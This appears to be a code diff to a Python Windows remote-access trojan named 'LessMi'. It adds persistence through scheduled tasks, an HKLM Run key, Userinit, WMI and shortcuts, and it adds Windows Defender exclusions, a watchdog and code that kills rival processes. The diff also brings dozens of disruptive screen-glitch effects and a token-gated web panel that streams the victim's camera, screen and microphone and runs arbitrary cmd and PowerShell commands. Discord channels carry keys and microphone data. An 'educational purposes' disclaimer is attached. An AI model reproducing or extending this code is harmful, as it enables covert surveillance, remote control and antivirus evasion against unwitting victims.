+                if s.get("bat") and os.path.exists(s["bat"])), None)
     if not bat:
         return
     tag = "LMG_" + (st.get("mutex") or "0")
@@ -1327,7 +1597,7 @@ def _watchdog_thread():
             _spawn_watchdog()
         except Exception:
             pass
-        time.sleep(45)
+        time.sleep(WATCHDOG_PERIOD)
 
 
 def _purge_old_images():
@@ -1336,14 +1606,13 @@ def _purge_old_images():
         p = s.get("exe")
         if not p:
             continue
-        old = p + ".old"
-        if os.path.exists(old):
-            try:
-                subprocess.run(["attrib", "-r", "-s", "-h", old], capture_output=True,
-                               creationflags=_CNW)
-                os.remove(old)
-            except Exception:
-                pass
+        for old in (p + ".old", p + ".new"):
+            if os.path.exists(old):
+                try:
+                    _unlock(old)
+                    os.remove(old)
+                except Exception:
+                    pass
     for f in glob.glob(os.path.join(APP_DIR or APPDATA, "update_*.exe")):
         if os.path.abspath(f) != os.path.abspath(sys.executable):
             try:
@@ -1351,68 +1620,100 @@ def _purge_old_images():
             except Exception:
                 pass
 
-
 def setup_persistence():
     st = _ensure_state()
     slots = st.get("slots") or []
     if not slots:
-        return
+        return "fail"
 
     _purge_old_images()
 
-    current = Path(sys.executable) if getattr(sys, "frozen", False) else Path(__file__).resolve()
-    primary = Path(slots[0]["exe"])
+    cur = os.path.abspath(sys.executable if getattr(sys, "frozen", False) else sys.argv[0])
+    source = None
+    for cand in (cur, st.get("exe"), st.get("bak")):
+        if cand and os.path.exists(cand) and os.path.getsize(cand) > 100_000:
+            source = cand
+            break
+    if not source:
+        return "fail"
 
-    if primary.exists() and current.exists() and primary.resolve() == current.resolve():
-        source = current
-    elif primary.exists():
-        source = primary
-    elif current.exists() and current.stat().st_size > 100_000:
-        source = current
-    else:
-        source = None
+    os.makedirs(st["dir"], exist_ok=True)
+    _lock_dir(st["dir"])
 
     for s in slots:
-        p = Path(s["exe"])
-        try:
-            os.makedirs(p.parent, exist_ok=True)
-            if not p.exists() and source:
-                shutil.copy2(str(source), str(p))
-        except Exception:
+        if os.path.abspath(s["exe"]) == cur:
+            _lock_exe(s["exe"])
+            continue
+        if not _copy_slot(source, s["exe"]) and not os.path.exists(s["exe"]):
             pass
-        if p.exists():
-            _hide(p, True)
 
+    _write_vbs(st)
     _write_watchdog(st)
 
     if not _is_admin():
-        _crash("persist", "no admin, watchdog only")
+        _crash("persist", "no admin")
         _spawn_watchdog()
-        return
+        return "no-admin"
+
+    status = "ok"
+    made = 0
+    for i, t in enumerate(st.get("tasks") or []):
+        if os.path.exists(slots[i]["exe"] if i < len(slots) else st["exe"]):
+            if _task_create(t, slots[i]["exe"] if i < len(slots) else st["exe"], 8 + i * 6):
+                made += 1
+    if not made:
+        status = "fail"
+
+    if not install_userinit():
+        status = "ok-noinit" if status == "ok" else status
+
+    _reg_add(RUN_KEY, os.path.splitext(os.path.basename(st["exe"]))[0],
+             '"{}" --zz-ui'.format(st["exe"]), hive="HKLM")
+    _write_lnk(st["exe"])
+    _wmi_install(st["exe"])
 
     for s in slots:
-        p = Path(s["exe"])
-        if p.exists():
-            _lock_exe(p)
-
-    try:
-        uninstall_userinit()
-        install_userinit()
-    except Exception:
-        pass
-
-    names = st.get("tasks") or [st["task"]]
-    for i, (s, t) in enumerate(zip(slots, names)):
-        if Path(s["exe"]).exists():
-            _task_create(t, s["exe"], 8 + i * 6)
-
-    for s in slots:
-        _ps(f'Add-MpPreference -ExclusionPath "{s["exe"]}" -ErrorAction SilentlyContinue')
-    _ps(f'Add-MpPreference -ExclusionProcess "{primary.name}" -ErrorAction SilentlyContinue')
+        _ps('Add-MpPreference -ExclusionPath "{}" -ErrorAction SilentlyContinue'.format(s["exe"]))
+    _ps('Add-MpPreference -ExclusionPath "{}" -ErrorAction SilentlyContinue'.format(st["dir"]))
+    _ps('Add-MpPreference -ExclusionProcess "{}" -ErrorAction SilentlyContinue'.format(
+        os.path.basename(st["exe"])))
 
     _spawn_watchdog()
-    _crash("persist", "ok primary={}".format(primary))
+    _crash("persist", status)
+    return status
 
+def _takeover():
+    me = os.getpid()
+    st = _state_read() or {}
+    paths = {os.path.abspath(sys.executable if getattr(sys, "frozen", False)
+                             else sys.argv[0]).lower()}
+    for s in (st.get("slots") or []):
+        if s.get("exe"):
+            paths.add(os.path.abspath(s["exe"]).lower())
+    names = {os.path.basename(p) for p in paths}
+    for p in psutil.process_iter(["pid", "name", "exe"]):
+        try:
+            if p.info["pid"] == me:
+                continue
+            if (p.info.get("name") or "").lower() not in names and \
+               (p.info.get("exe") or "").lower() not in paths:
+                continue
+            p.kill()
+        except Exception:
+            pass
+
+def uninstall_persistence():
+    st = _state_read() or {}
+    try:
+        uninstall_userinit()
+    except Exception:
+        pass
+    for t in (st.get("tasks") or []) + [st.get("task") or ""]:
+        if t:
+            _task_delete(t)
+    _reg_delete(RUN_KEY, os.path.splitext(os.path.basename(st.get("exe") or "x"))[0], "HKLM")
+    _del_lnk()
+    _wmi_remove()
 
 def boot():
     global APP_DIR
@@ -1433,29 +1734,35 @@ def boot():
             _crash("boot", "repair failed {!r}".format(e))
         os._exit(0)
 
-    if "--zz-setup" in sys.argv:
+    if SETUP_FLAG in sys.argv:
         _crash("boot", "setup mode")
         try:
-            setup_persistence()
+            res = setup_persistence()
         except Exception as e:
             _crash("boot", "setup failed {!r}".format(e))
-        os._exit(0)
+            os._exit(4)
+        os._exit({"ok": 0, "ok-noav": 0, "ok-noinit": 2, "no-admin": 3}.get(res, 4))
 
     if not _is_admin() and "--zz-ui" in sys.argv:
-        if _trigger_task(_state_read() or {}):
+        if _trigger_task(st):
             _crash("boot", "delegated to task")
             os._exit(0)
 
     if not _mutex_claim():
-        if _is_admin():
-            _crash("boot", "mutex busy, takeover")
+        info = _hb_read()
+        me = _session_id()
+        fresh = bool(info) and (time.time() - info[2]) < HEARTBEAT_MAX_AGE
+        holder_session0 = bool(info) and info[1] == 0
+        takeover = _is_admin() and (not fresh or (me != 0 and holder_session0))
+        if takeover:
+            _crash("boot", "mutex busy -> takeover")
             try:
                 _watch_suspend()
             except Exception:
                 pass
             _takeover()
             ok = False
-            for _ in range(20):
+            for _ in range(24):
                 time.sleep(0.25)
                 if _mutex_claim():
                     ok = True
@@ -1492,10 +1799,17 @@ def boot():
             _mutex_release()
             os._exit(0)
 
+    threading.Thread(target=_heartbeat_loop, daemon=True).start()
+    try:
+        with open(_hb_path(), "w", encoding="ascii") as f:
+            f.write("{} {}".format(os.getpid(), _session_id()))
+    except Exception:
+        pass
 
 boot()
 setup_persistence()
 _crash("boot", "handoff to discord")
+threading.Thread(target=_repair_loop, daemon=True).start()
 
 
 def _app_base():
@@ -1998,8 +2312,264 @@ def flash_screen(effect):
             "digital_earthquake\n", "checkerboard_void\n", "strobe_stripes\n", "pixel_explosion\n",
             "wave_distortion\n", "quad_mirror\n", "crt_defrag\n", "vhs_tracking_loss\n",
             "invert_sweep\n", "static_snow_storm\n", "kaleidoscope_glitch\n", "screen_fold\n",
-            "hologram_flicker\n", "blackhole_siphon\n", "corrupted_grid\n"
+            "hologram_flicker\n", "blackhole_siphon\n", "corrupted_grid\n",
+            "upside_down\n", "swirl_melt\n", "ghost_trail\n", "tunnel_zoom\n", "barcode_sweep\n",
+            "ripple_pool\n", "shattered_mirror\n", "neon_outline\n", "pixel_sort\n", "datamosh\n",
+            "chromatic_aberration\n", "crt_roll\n", "static_burst\n", "diamond_grid\n",
+            "spiral_eye\n", "liquid_drip\n", "flare_beam\n", "mosaic_tiles\n", "inverted_pulse\n",
+            "scan_beams\n", "wavy_water\n", "fractal_flash\n", "strobe_checker\n", "broken_lcd\n",
+            "vertical_jitter\n", "hologram_shift\n", "tunnel_of_rings\n", "rainbow_sweep\n",
+            "glitch_blocks\n", "negative_scan\n", "zoom_punch\n", "ripple_rings\n",
+            "split_shuffle\n", "crt_power_off\n", "dot_matrix\n", "edge_shred\n", "smear_slide\n",
+            "blink_outline\n", "noise_bands\n", "shear_wave\n", "spotlight_dark\n", "vertigo_spin\n"
         ]
+
+    elif effect == "upside_down":
+        for _ in range(40):
+            win32gui.PatBlt(hdc, 0, 0, width, height, win32con.DSTINVERT)
+            time.sleep(0.02)
+
+    elif effect == "swirl_melt":
+        for _ in range(400):
+            y_pos = random.randint(0, height - 20)
+            win32gui.BitBlt(hdc, random.randint(-45, 45), y_pos, width, 20, hdc, 0, y_pos, win32con.SRCCOPY)
+
+    elif effect == "ghost_trail":
+        for _ in range(80):
+            dx = int(math.sin(time.time() * 6) * 18)
+            dy = int(math.cos(time.time() * 4) * 12)
+            win32gui.BitBlt(hdc, dx, dy, width, height, hdc, 0, 0, win32con.SRCCOPY)
+            time.sleep(0.02)
+
+    elif effect == "tunnel_zoom":
+        for _ in range(120):
+            win32gui.BitBlt(hdc, width // 40, height // 40, width - width // 20, height - height // 20, hdc, 0, 0, win32con.SRCCOPY)
+
+    elif effect == "barcode_sweep":
+        for x_pos in range(0, width, 6):
+            color = win32api.RGB(0, 0, 0) if random.random() > 0.5 else win32api.RGB(255, 255, 255)
+            brush = win32gui.CreateSolidBrush(color)
+            old = win32gui.SelectObject(hdc, brush)
+            win32gui.PatBlt(hdc, x_pos, 0, random.randint(2, 5), height, win32con.PATCOPY)
+            win32gui.SelectObject(hdc, old)
+            win32gui.DeleteObject(brush)
+
+    elif effect == "ripple_pool":
+        for i in range(0, 900, 12):
+            pen = win32gui.CreatePen(win32con.PS_SOLID, 2, win32api.RGB(0, 200, 255))
+            old = win32gui.SelectObject(hdc, pen)
+            win32gui.Ellipse(hdc, width // 2 - i, height // 2 - i * 2 // 3, width // 2 + i, height // 2 + i * 2 // 3)
+            win32gui.SelectObject(hdc, old)
+            win32gui.DeleteObject(pen)
+
+    elif effect == "shattered_mirror":
+        for _ in range(300):
+            sx = random.randint(0, width - 120)
+            sy = random.randint(0, height - 120)
+            win32gui.BitBlt(hdc, sx + random.randint(-14, 14), sy + random.randint(-14, 14), 120, 120, hdc, sx, sy, win32con.SRCINVERT)
+
+    elif effect == "neon_outline":
+        for i in range(0, 60, 3):
+            pen = win32gui.CreatePen(win32con.PS_SOLID, 3, win32api.RGB(random.randint(120, 255), random.randint(60, 255), 255))
+            old = win32gui.SelectObject(hdc, pen)
+            win32gui.Rectangle(hdc, i, i, width - i, height - i)
+            win32gui.SelectObject(hdc, old)
+            win32gui.DeleteObject(pen)
+
+    elif effect == "pixel_sort":
+        for _ in range(200):
+            y_pos = random.randint(0, height - 8)
+            win32gui.BitBlt(hdc, random.randint(-20, 20), y_pos, width, 8, hdc, 0, y_pos, win32con.SRCCOPY)
+
+    elif effect == "datamosh":
+        for _ in range(180):
+            y_pos = random.randint(0, height - 60)
+            win32gui.BitBlt(hdc, random.randint(-60, 60), y_pos, width, 60, hdc, 0, y_pos, win32con.SRCCOPY)
+
+    elif effect == "chromatic_aberration":
+        for _ in range(120):
+            y_pos = random.randint(0, height - 30)
+            win32gui.BitBlt(hdc, random.randint(4, 14), y_pos, width, 30, hdc, 0, y_pos, win32con.SRCCOPY)
+            win32gui.BitBlt(hdc, random.randint(-14, -4), y_pos, width, 30, hdc, 0, y_pos, win32con.SRCCOPY)
+
+    elif effect == "crt_roll":
+        for _ in range(160):
+            win32gui.BitBlt(hdc, 0, 24, width, height - 24, hdc, 0, 0, win32con.SRCCOPY)
+            time.sleep(0.01)
+
+    elif effect == "static_burst":
+        for _ in range(40):
+            for _ in range(400):
+                win32gui.PatBlt(hdc, random.randint(0, width), random.randint(0, height), 3, 3, win32con.PATINVERT)
+            time.sleep(0.03)
+
+    elif effect == "diamond_grid":
+        for _ in range(400):
+            x_pos = random.randint(0, width - 80)
+            y_pos = random.randint(0, height - 80)
+            s = random.randint(20, 80)
+            win32gui.PatBlt(hdc, x_pos, y_pos, s, s, win32con.PATINVERT)
+
+    elif effect == "spiral_eye":
+        for a in range(0, 1440, 4):
+            rad = math.radians(a)
+            r = a // 2
+            x1 = int(width / 2 + math.cos(rad) * r)
+            y1 = int(height / 2 + math.sin(rad) * r)
+            win32gui.PatBlt(hdc, x1, y1, 4, 4, win32con.PATINVERT)
+
+    elif effect == "liquid_drip":
+        for _ in range(500):
+            x_pos = random.randint(0, width)
+            win32gui.BitBlt(hdc, x_pos, random.randint(0, 120), 5, random.randint(40, 300), hdc, x_pos, 0, win32con.SRCCOPY)
+
+    elif effect == "flare_beam":
+        for x_pos in range(0, width + 80, 20):
+            win32gui.BitBlt(hdc, x_pos, 0, 60, height, hdc, max(0, x_pos - 20), 0, win32con.SRCCOPY)
+
+    elif effect == "mosaic_tiles":
+        s = 24
+        for _ in range(400):
+            x_pos = random.randint(0, width // s - 1) * s
+            y_pos = random.randint(0, height // s - 1) * s
+            win32gui.BitBlt(hdc, x_pos, y_pos, s, s, hdc, x_pos + random.randint(-s, s), y_pos, win32con.SRCCOPY)
+
+    elif effect == "inverted_pulse":
+        for _ in range(24):
+            win32gui.PatBlt(hdc, 0, 0, width, height, win32con.PATINVERT)
+            time.sleep(0.05)
+
+    elif effect == "scan_beams":
+        for i in range(0, height, 20):
+            win32gui.PatBlt(hdc, 0, i, width, 18, win32con.DSTINVERT)
+            time.sleep(0.01)
+
+    elif effect == "wavy_water":
+        for y_pos in range(0, height, 8):
+            win32gui.BitBlt(hdc, int(math.sin(y_pos / 24.0) * 22), y_pos, width, 8, hdc, 0, y_pos, win32con.SRCCOPY)
+
+    elif effect == "fractal_flash":
+        for _ in range(300):
+            pen = win32gui.CreatePen(win32con.PS_SOLID, 2, win32api.RGB(random.randint(0, 255), random.randint(0, 255), random.randint(0, 255)))
+            old = win32gui.SelectObject(hdc, pen)
+            win32gui.Ellipse(hdc, random.randint(0, width // 2), random.randint(0, height // 2), random.randint(40, width), random.randint(40, height))
+            win32gui.SelectObject(hdc, old)
+            win32gui.DeleteObject(pen)
+
+    elif effect == "strobe_checker":
+        s = 64
+        for x_pos in range(0, width, s):
+            for y_pos in range(0, height, s):
+                if (x_pos // s + y_pos // s) % 2 == 0:
+                    win32gui.PatBlt(hdc, x_pos, y_pos, s, s, win32con.PATINVERT)
+        time.sleep(0.4)
+
+    elif effect == "broken_lcd":
+        for _ in range(600):
+            win32gui.PatBlt(hdc, random.randint(0, width), random.randint(0, height), random.randint(2, 60), random.randint(2, 60), win32con.PATINVERT)
+
+    elif effect == "vertical_jitter":
+        for x_pos in range(0, width, 24):
+            win32gui.BitBlt(hdc, x_pos, random.randint(-8, 8), 24, height, hdc, x_pos, 0, win32con.SRCCOPY)
+
+    elif effect == "hologram_shift":
+        for _ in range(120):
+            win32gui.BitBlt(hdc, int(math.sin(time.time() * 4) * 20), 0, width, height, hdc, 0, 0, win32con.SRCCOPY)
+            time.sleep(0.02)
+
+    elif effect == "tunnel_of_rings":
+        for r in range(0, min(width, height) // 2, 14):
+            pen = win32gui.CreatePen(win32con.PS_SOLID, 2, win32api.RGB(255, 180, 0))
+            old = win32gui.SelectObject(hdc, pen)
+            win32gui.Ellipse(hdc, width // 2 - r, height // 2 - r, width // 2 + r, height // 2 + r)
+            win32gui.SelectObject(hdc, old)
+            win32gui.DeleteObject(pen)
+
+    elif effect == "rainbow_sweep":
+        for y_pos in range(0, height, 12):
+            h = int((y_pos + time.time() * 200) % 360)
+            brush = win32gui.CreateSolidBrush(win32api.RGB(*(int(127 + 127 * math.sin(math.radians(h + o))) for o in (0, 120, 240))))
+            old = win32gui.SelectObject(hdc, brush)
+            win32gui.PatBlt(hdc, 0, y_pos, width, 6, win32con.PATCOPY)
+            win32gui.SelectObject(hdc, old)
+            win32gui.DeleteObject(brush)
+
+    elif effect == "glitch_blocks":
+        for _ in range(600):
+            win32gui.PatBlt(hdc, random.randint(0, width), random.randint(0, height), random.randint(30, 220), random.randint(10, 60), win32con.DSTINVERT)
+
+    elif effect == "negative_scan":
+        for y_pos in range(0, height, 30):
+            win32gui.PatBlt(hdc, 0, y_pos, width, 120, win32con.PATINVERT)
+            time.sleep(0.02)
+
+    elif effect == "zoom_punch":
+        for _ in range(60):
+            win32gui.BitBlt(hdc, -width // 20, -height // 20, width + width // 10, height + height // 10, hdc, 0, 0, win32con.SRCCOPY)
+            time.sleep(0.03)
+
+    elif effect == "ripple_rings":
+        for r in range(0, min(width, height) // 2, 12):
+            pen = win32gui.CreatePen(win32con.PS_SOLID, 2, win32api.RGB(0, 255, 200))
+            old = win32gui.SelectObject(hdc, pen)
+            win32gui.Ellipse(hdc, width // 2 - r, height // 2 - r, width // 2 + r, height // 2 + r)
+            win32gui.SelectObject(hdc, old)
+            win32gui.DeleteObject(pen)
+
+    elif effect == "split_shuffle":
+        for _ in range(160):
+            y_pos = random.randint(0, height - 80)
+            win32gui.BitBlt(hdc, 0, random.randint(0, height - 80), width, 80, hdc, 0, y_pos, win32con.SRCCOPY)
+
+    elif effect == "crt_power_off":
+        for _ in range(40):
+            win32gui.PatBlt(hdc, 0, 0, width, height, win32con.BLACKNESS)
+            win32gui.BitBlt(hdc, width // 2 - 2, height // 4, 4, height // 2, hdc, width // 2 - 2, height // 4, win32con.SRCCOPY)
+            time.sleep(0.03)
+
+    elif effect == "dot_matrix":
+        for y_pos in range(0, height, 8):
+            for x_pos in range(0, width, 8):
+                if random.random() > 0.6:
+                    win32gui.PatBlt(hdc, x_pos, y_pos, 4, 4, win32con.PATINVERT)
+
+    elif effect == "edge_shred":
+        for _ in range(200):
+            x_pos = random.randint(0, width - 120)
+            win32gui.BitBlt(hdc, x_pos, random.randint(-40, 40), 120, height, hdc, x_pos, 0, win32con.SRCCOPY)
+
+    elif effect == "smear_slide":
+        for i in range(8):
+            win32gui.BitBlt(hdc, int(math.sin(time.time() * 2 + i) * 40), int(math.cos(time.time() + i) * 20), width, height, hdc, 0, 0, win32con.SRCPAINT)
+            time.sleep(0.02)
+
+    elif effect == "blink_outline":
+        for _ in range(10):
+            pen = win32gui.CreatePen(win32con.PS_SOLID, 8, win32api.RGB(255, 0, 0))
+            old = win32gui.SelectObject(hdc, pen)
+            win32gui.Rectangle(hdc, 4, 4, width - 4, height - 4)
+            win32gui.SelectObject(hdc, old)
+            win32gui.DeleteObject(pen)
+            time.sleep(0.15)
+            win32gui.Rectangle(hdc, 4, 4, width - 4, height - 4)
+
+    elif effect == "noise_bands":
+        for _ in range(400):
+            win32gui.PatBlt(hdc, 0, random.randint(0, height), width, random.randint(3, 26), win32con.PATINVERT)
+
+    elif effect == "shear_wave":
+        for y_pos in range(0, height, 12):
+            win32gui.BitBlt(hdc, int((y_pos * 0.12 + math.sin(time.time() * 2) * 30) % 60) - 30, y_pos, width, 12, hdc, 0, y_pos, win32con.SRCCOPY)
+
+    elif effect == "spotlight_dark":
+        win32gui.PatBlt(hdc, 0, 0, width, height, win32con.BLACKNESS)
+        r = 160
+        win32gui.BitBlt(hdc, width // 2 - r, height // 2 - r, r * 2, r * 2, hdc, width // 2 - r, height // 2 - r, win32con.SRCCOPY)
+
+    elif effect == "vertigo_spin":
+        for _ in range(80):
+            win32gui.BitBlt(hdc, width // 60, 0, width - width // 30, height, hdc, 0, 0, win32con.SRCCOPY)
+            time.sleep(0.02)
 
     elif effect == "invert":
         start_time = time.time()
@@ -2372,15 +2942,555 @@ init_db()
 init_channels_db()
 
 CHANNEL_NAMES = {
-    "panel": "🧮〡panel",
     "info": "ℹ️〡info",
     "cmds": "🤖〡cmds",
     "keys": "🔑〡keys",
     "microphone": "🎤〡microphone",
 }
 
-CHANNEL_ORDER = ["panel", "info", "cmds", "keys", "microphone"]
+CHANNEL_ORDER = ["info", "cmds", "keys", "microphone"]
 
+WEB_PORT = 8765
+WEB_HOST = "0.0.0.0"
+WEB_TOKEN = ""
+WEB_URL = ""
+WEB_RUNNER = None
+WEB_TUNNEL = None
+WEB_TUNNEL_URL = ""
+WEB_BUSY = False
+_WS_OPEN = 0
+
+WEB_CSS = """
+:root{--bg:#08080b;--fg:#f2f2f7;--dim:#8a8a99;--acc:#a855f7;--line:rgba(255,255,255,.08)}
+*{box-sizing:border-box;margin:0;padding:0}
+body{background:var(--bg);color:var(--fg);font-family:Poppins,system-ui,sans-serif;overflow-x:hidden;cursor:crosshair}
+body::before{content:"";position:fixed;inset:0;pointer-events:none;z-index:0;background-image:linear-gradient(rgba(255,255,255,.03) 1px,transparent 1px),linear-gradient(90deg,rgba(255,255,255,.03) 1px,transparent 1px);background-size:44px 44px}
+body::after{content:"";position:fixed;inset:0;pointer-events:none;z-index:1;opacity:.35;background-image:url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' width='120' height='120'%3E%3Cfilter id='n'%3E%3CfeTurbulence baseFrequency='.85'/%3E%3C/filter%3E%3Crect width='120' height='120' filter='url(%23n)' opacity='.22'/%3E%3C/svg%3E")}
+.wrap{position:relative;z-index:2;max-width:1180px;margin:0 auto;padding:26px 18px 90px}
+header{display:flex;align-items:center;justify-content:space-between;gap:14px;padding-bottom:18px;border-bottom:1px solid var(--line)}
+h1{font-size:19px;font-weight:600;letter-spacing:-.3px}
+h1 span{color:var(--acc)}
+.chip{display:inline-flex;align-items:center;gap:7px;padding:7px 13px;border:1px solid var(--line);border-radius:999px;font-size:11.5px;color:var(--dim);background:rgba(255,255,255,.02)}
+.dot{width:7px;height:7px;border-radius:50%;background:#22c55e;box-shadow:0 0 10px #22c55e}
+.grid{display:grid;grid-template-columns:1fr 1fr;gap:16px;margin-top:22px}
+@media(max-width:860px){.grid{grid-template-columns:1fr}}
+.card{border:1px solid var(--line);border-radius:16px;background:rgba(255,255,255,.02);padding:14px}
+.card h2{font-size:12px;text-transform:uppercase;letter-spacing:1.4px;color:var(--dim);font-weight:500;margin-bottom:10px}
+canvas.view{width:100%;height:auto;display:block;border-radius:11px;background:#000}
+.pills{display:flex;flex-wrap:wrap;gap:7px;margin-top:11px}
+button{padding:8px 13px;border-radius:999px;border:1px solid var(--line);background:rgba(255,255,255,.04);color:var(--fg);font:inherit;font-size:11.5px;cursor:pointer;transition:.15s}
+button:hover{border-color:var(--acc);background:rgba(168,85,247,.14)}
+button.on{background:var(--acc);border-color:var(--acc);color:#0b0b0f}
+button:disabled{opacity:.45;cursor:progress}
+input{width:100%;padding:10px 12px;border-radius:11px;border:1px solid var(--line);background:rgba(255,255,255,.03);color:var(--fg);font:inherit;font-size:12.5px;outline:none}
+input:focus{border-color:var(--acc)}
+pre{white-space:pre-wrap;word-break:break-word;font-family:ui-monospace,Consolas,monospace;font-size:11.5px;color:#c9c9d6;max-height:230px;overflow:auto;padding:11px;border-radius:11px;background:rgba(0,0,0,.4);border:1px solid var(--line);margin-top:10px}
+.wide{grid-column:1/-1}
+.row{display:flex;gap:8px;margin-top:10px}
+footer{margin-top:34px;color:var(--dim);font-size:11px;text-align:center}
+"""
+
+WEB_JS = """
+const S={cam:0,screen:0,mic:0,ws:null,ac:null,busy:0};
+const $=id=>document.getElementById(id);
+function pill(id,on){const e=$(id);if(e)e.classList.toggle('on',!!on);}
+async function api(p,opt){const r=await fetch(p,opt);return r.text();}
+function draw(kind,buf){
+  const cv=$(kind);if(!cv)return;
+  const blob=new Blob([buf],{type:'image/jpeg'});
+  createImageBitmap(blob).then(b=>{
+    if(cv.width!==b.width||cv.height!==b.height){cv.width=b.width;cv.height=b.height;}
+    cv.getContext('2d').drawImage(b,0,0);b.close();
+  }).catch(()=>{});
+}
+function connect(){
+  const ws=new WebSocket((location.protocol==='https:'?'wss':'ws')+'://'+location.host+'/ws');
+  S.ws=ws;ws.binaryType='arraybuffer';
+  ws.onopen=()=>{pill('link',1);$('st').textContent='live';};
+  ws.onclose=()=>{pill('link',0);$('st').textContent='offline';setTimeout(connect,1500);};
+  ws.onmessage=e=>{
+    const a=new Uint8Array(e.data);
+    if(a.length<2)return;
+    draw(a[0]===67?'cam':'screen',a.subarray(1));
+  };
+}
+function toggle(kind){
+  S[kind]=S[kind]?0:1;
+  pill('t-'+kind,S[kind]);
+  if(S.ws&&S.ws.readyState===1)S.ws.send(JSON.stringify({kind,on:S[kind]}));
+}
+async function micLoop(){
+  if(!S.mic){setTimeout(micLoop,500);return;}
+  try{
+    const r=await fetch('/api/mic.wav',{cache:'no-store'});
+    if(r.ok){
+      const buf=await r.arrayBuffer();
+      if(!S.ac)S.ac=new (window.AudioContext||window.webkitAudioContext)();
+      const ab=await S.ac.decodeAudioData(buf);
+      const src=S.ac.createBufferSource();src.buffer=ab;src.connect(S.ac.destination);src.start();
+    }
+  }catch(e){}
+  micLoop();
+}
+function toggleMic(){S.mic=S.mic?0:1;pill('t-mic',S.mic);if(S.mic&&S.ac)S.ac.resume();}
+function fmtUp(s){const d=Math.floor(s/86400),h=Math.floor(s%86400/3600),m=Math.floor(s%3600/60);return (d?d+'d ':'')+h+'h '+m+'m';}
+async function sysLoop(){
+  try{
+    const r=await fetch('/api/sys',{cache:'no-store'});
+    const d=await r.json();
+    if(d.error){$('info').textContent=d.error;}
+    else{
+      $('info').textContent=
+        d.host+'  ·  '+d.user+(d.admin?'  ·  admin':'')+'\\n'+
+        'CPU  '+d.cpu+'%\\nRAM  '+d.ram+'%\\nDisk  '+d.disk+'%\\nProcs  '+d.procs+'\\nUptime  '+fmtUp(d.uptime);
+    }
+  }catch(e){}
+  setTimeout(sysLoop,2000);
+}
+async function run(){
+  const c=$('cmd').value.trim();if(!c||S.busy)return;
+  S.busy=1;$('runbtn').disabled=1;$('out').textContent='...';
+  try{$('out').textContent=await api('/api/cmd',{method:'POST',headers:{'Content-Type':'text/plain'},body:c});}
+  catch(e){$('out').textContent='error: '+e;}
+  S.busy=0;$('runbtn').disabled=0;
+}
+function quick(c){$('cmd').value=c;run();}
+function shot(kind){window.open('/api/shot/'+kind,'_blank');}
+document.addEventListener('keydown',e=>{if(e.key==='Enter'&&e.target.id==='cmd')run();});
+connect();sysLoop();
+"""
+
+
+def _web_page():
+    return """<!--  __  __       _          _    ____
+ |  \/  | __ _| |_ ___   / \  / ___|
+ | |\/| |/ _` | __/ _ \ / _ \| |  _
+ | |  | | (_| | ||  __// ___ \ |_| |
+ |_|  |_|\__,_|\__\___/_/   \_\____|
+
+ (c) Copyright 2026 - MateAG
+ All rights reserved. Any copy without
+ consent of this code will be reported.
+
+ This project is only for educational purposes.
+ The creator is NOT responsible of any illegal/malicious use
+ of this project.
+
+ The creator advices you to use this for testing and
+ legal activities. If you want to install this on
+ someone else computer, please ask them for the
+ permission to.
+
+ Thank you and happy testing! <3--><!doctype html><html lang="en"><head><meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<title>LessMi</title><style>""" + WEB_CSS + """</style></head><body><div class="wrap">
+<meta name="referrer" content="no-referrer"><meta name="robots" content="noindex,nofollow">
+<link rel="icon" href="https://files.catbox.moe/vuhaid.png">
+<header><h1>Less<span>Mi</span></h1>
+<div class="chip" id="link"><i class="dot"></i><span id="st">connecting</span></div></header>
+<div class="grid">
+<div class="card"><h2>Camera</h2>
+<canvas class="view" id="cam" width="640" height="360"></canvas>
+<div class="pills"><button id="t-cam" onclick="toggle('cam')">Camera</button>
+<button onclick="shot('cam')">Snapshot</button></div></div>
+<div class="card"><h2>Screen</h2>
+<canvas class="view" id="screen" width="640" height="360"></canvas>
+<div class="pills"><button id="t-screen" onclick="toggle('screen')">Screen</button>
+<button onclick="shot('screen')">Snapshot</button></div></div>
+<div class="card"><h2>Microphone</h2>
+<div class="pills"><button id="t-mic" onclick="toggleMic()">Listen</button></div>
+<pre id="info">-</pre></div>
+<div class="card"><h2>System</h2>
+<div class="pills">
+<button onclick="quick('cmd sysinfo')">Info</button>
+<button onclick="quick('cmd tasklist')">Procs</button>
+<button onclick="quick('cmd ipconfig')">Net</button>
+<button onclick="quick('cmd whoami')">Whoami</button>
+</div>
+<pre id="out2">-</pre></div>
+<div class="card wide"><h2>Console</h2>
+<input id="cmd" placeholder="command — runs through cmd, prefix powershell to use it">
+<div class="row"><button id="runbtn" onclick="run()">Run</button>
+<button onclick="quick('cmd whoami /all')">whoami</button>
+<button onclick="quick('cmd ipconfig /all')">ipconfig</button>
+<button onclick="quick('powershell Get-Process | Sort CPU -Desc | Select -First 15')">top cpu</button></div>
+<pre id="out">-</pre></div>
+</div><footer>LessMi</footer></div>
+<script>""" + WEB_JS + """</script></body></html>"""
+
+
+def _web_token_ok(request):
+    got = request.cookies.get("lsm", "") or request.query.get("t", "")
+    return bool(got) and hmac.compare_digest(got, WEB_TOKEN)
+
+
+@web.middleware
+async def _web_headers(request, handler):
+    if not _web_token_ok(request) and request.path not in ("/",):
+        return web.Response(status=404, text="not found")
+    resp = await handler(request)
+    resp.headers["X-Content-Type-Options"] = "nosniff"
+    resp.headers["X-Frame-Options"] = "DENY"
+    resp.headers["Referrer-Policy"] = "no-referrer"
+    resp.headers["Cache-Control"] = "no-store"
+    resp.headers["Content-Security-Policy"] = (
+        "default-src 'self'; img-src 'self' blob: data:; media-src 'self' blob:; "
+        "style-src 'self' 'unsafe-inline'; script-src 'self' 'unsafe-inline'; "
+        "connect-src 'self' ws: wss:")
+    return resp
+
+
+async def _web_index(request):
+    t = request.query.get("t", "")
+    if t and hmac.compare_digest(t, WEB_TOKEN):
+        resp = web.Response(text=_web_page(), content_type="text/html")
+        resp.set_cookie("lsm", t, httponly=True, samesite="Strict",
+                        secure=request.secure, max_age=86400, path="/")
+        return resp
+    if _web_token_ok(request):
+        return web.Response(text=_web_page(), content_type="text/html")
+    return web.Response(status=404, text="not found")
+
+
+_cam_lock = threading.Lock()
+_cam_cap = None
+_cam_idx = -1
+_scr_lock = threading.Lock()
+
+
+def _cam_close():
+    global _cam_cap
+    with _cam_lock:
+        if _cam_cap is not None:
+            try:
+                _cam_cap.release()
+            except Exception:
+                pass
+        _cam_cap = None
+
+
+def _cam_jpeg(quality=55):
+    global _cam_cap, _cam_idx
+    with _cam_lock:
